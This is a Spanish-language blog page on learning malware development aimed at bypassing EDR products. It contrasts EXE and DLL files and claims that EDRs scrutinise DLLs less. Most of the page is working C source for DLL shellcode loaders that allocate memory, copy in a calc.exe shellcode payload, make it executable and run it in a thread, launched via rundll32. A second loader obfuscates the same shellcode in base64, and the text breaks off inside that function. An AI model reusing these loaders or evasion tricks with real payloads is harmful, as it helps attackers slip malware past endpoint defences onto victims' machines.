<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/exe_vs_dll.html" />
<meta property="og:url" content="http://localhost:4000/exe_vs_dll.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/exe_vs_dll.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="indice">Indice</h1>

<ol>
  <li><a href="#binarios-exe-vs-librerías-dinámicas-dll">Binarios exe Vs librerías dinámicas dll</a></li>
  <li><a href="#dll-inyeccion-de-codigo">DLL Inyección de código</a></li>
  <li><a href="#dll-calc-shellcode-section-text">DLL calc shellcode section text</a></li>
  <li><a href="#dll-calc-shellcode-base64-codificado">DLL calc shellcode Base64 codificado</a></li>
  <li><a href="#dll-calc-shellcode-encriptacion-xor">DLL calc shellcode Encriptacion XOR</a></li>
  <li><a href="#dll-calc-shellcode-encriptacion-aes">DLL calc shellcode Encriptacion AES</a></li>
</ol>

<h1 id="binarios-exe-vs-librerías-dinámicas-dll">Binarios exe Vs librerías dinámicas dll</h1>

<p>Estos dos tipos de ficheros, tienen diferencias a tres nieveles :</p>

<ul>
  <li>Sistema operativo: tipo de fichero</li>
  <li>Código fuente: estructúra de código</li>
  <li>Ejecución: auto ejecutable vs depende de la ejecución mediante un binario</li>
</ul>

<h2 id="binario-exe">Binario .exe</h2>

<p>Por definición un fichero exe, dentro del sistema operativo tiene la posibilidad de ejecutarse por si mismo, crear un proceso que cobrará vida propia y realizará las operaciones que se han desarrollado en el código fuente.
Es por este motivo que los EDR, muestran especial interes en las librerías que cargan y operaciones que realizan en tiempo de ejecución, si están firmadas o no por alguien de confianza. etc.</p>

<p>A nivel código fuente será relevante diferenciarlo por su estructura de una dll
Como ejemplo, todo el código funete de las seccionies:
<a href="./Dropperscodigo.html">Droppers_codigo</a>
<a href="./Obfuscacion_encriptacion.html">Obfuscacion_encriptacion</a></p>

<h2 id="librería-dll">Librería dll</h2>

<p>Las librerías dinámicas son cargadas en tiempo de ejecución por los binerios .exe, estas pueden ser del propio sistema operativo para interacturar con sus funcionalidades, memoria, kernel, etc. O desarrolladas, como será el caso.</p>

<p>Un punto interesante es que las librerías dinámicas o Dlls tambien son ejecutables por si mismas dentro del sistema operativo, por binarios como rundll32.exe
Y los EDRs tienen le dan una menor relevancia, al código que estas contienen por lo que siempre será mas facil reliar el bypass de un EDR con este tipo de binarios/ejecutables.</p>

<p>La estructura de su código es diferente, luciendo el caso base del siguiente modo:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	
	<span class="n">MessageBox</span><span class="p">(</span>
		<span class="nb">NULL</span><span class="p">,</span>
		<span class="s">"Dll Execution example "</span><span class="p">,</span>
		<span class="s">"f0ns1"</span><span class="p">,</span>
        <span class="n">MB_OK</span>
	<span class="p">);</span>
	 
		 <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>La dll exporta una única función con nombre f0ns1, es posible revisarlo con la herramienta dumpin:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dumpbin /EXPORTS f0ns1_exec.dll
Microsoft (R) COFF/PE Dumper Version 14.27.29112.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file f0ns1_exec.dll

File Type: DLL

  Section contains the following exports for f0ns1_exec.dll

    00000000 characteristics
    FFFFFFFF time date stamp
        0.00 version
           1 ordinal base
           1 number of functions
           1 number of names

    ordinal hint RVA      name

          1    0 00001000 f0ns1

  Summary

        2000 .data
        1000 .pdata
        9000 .rdata
        1000 .reloc
        B000 .text
        1000 _RDATA

</code></pre></div></div>
<p>La ejecución de la Dll mediante el binario rundll32:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe f0ns1_exec.dll,f0ns1

</code></pre></div></div>

<p>Evidencia de la ejecución:</p>

<p><img src="/assets/images/basedll.png" alt="basedll" /></p>

<h1 id="dll-inyección-de-código">DLL Inyección de código</h1>

<h2 id="dll-calc-shellcode-section-text">DLL calc shellcode section text</h2>

<p>El código asociado a la inyección de la calculadora:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
</span>

<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span>
  <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
  <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
  <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
  <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span>
  <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
  <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span>
  <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span>
  <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span>
  <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
  <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x00</span>
	<span class="p">};</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mi">276</span><span class="p">;</span>
	
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sotred payload in .text section: %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"payload addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualAlloc] of new moemory region: %-20s : 0x%-016p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"exec_mem addr"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">exec_mem</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [RtlMoveMemory] copy data </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> [CreateThread] Exec stored payload </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>La ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe base_injection_exec.dll,f0ns1
</code></pre></div></div>

<p><img src="/assets/images/base_injection_exec_dll.png" alt="base_injection_exec_dll" /></p>

<h2 id="dll-calc-shellcode-base64-codificado">DLL calc shellcode Base64 codificado</h2>

<p>El código asociado a la inyección de la calculadora obfuscada en Base64:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "Crypt32.lib")
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>

<span class="kt">int</span> <span class="n">DecodeBase64</span><span class="p">(</span> <span class="k">const</span> <span class="n">BYTE</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">srcLen</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dstLen</span> <span class="p">)</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">outLen</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">fRet</span><span class="p">;</span>
	<span class="n">outLen</span> <span class="o">=</span> <span class="n">dstLen</span><span class="p">;</span>
	<span class="n">fRet</span> <span class="o">=</span> <span class="n">CryptStringToBinary</span><span class="p">(</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span> <span class="n">src</span><span class="p">,</span> <span class="n">srcLen</span><span class="p">,</span> <span class="n">CRYPT_STRING_BASE64</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span> <span class="p">)</span><span class="n">dst</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outLen</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fRet</span><span class="p">)</span> <span class="n">outLen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// failed</span>
	<span class="k">return</span><span class="p">(</span> <span class="n">outLen</span> <span class="p">);</span>
	<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">calc_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">calc_payload</span><span class="p">);</span>
	<span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">outLenb64</span><span class="p">;</span>
	<span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
